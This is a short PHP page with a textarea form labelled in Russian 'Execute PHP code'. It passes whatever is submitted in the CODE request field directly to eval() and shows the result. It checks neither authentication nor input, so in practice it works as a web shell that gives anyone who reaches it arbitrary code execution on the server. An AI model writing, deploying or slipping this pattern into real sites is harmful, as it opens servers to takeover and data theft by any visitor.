<form method="post">
	<div class="form-group">
		<textarea
			class="form-control"
			name="CODE"
			rows="20"
		><?= htmlspecialchars($_REQUEST['CODE']) ?></textarea>
	</div>
	<input
		type="submit"
		value="Выполнить PHP код"
		class="btn btn-success"
	/>
</form>
<?php
if (!empty($_REQUEST['CODE'])) {
	echo '<hr/>';
	eval($_REQUEST['CODE']);
}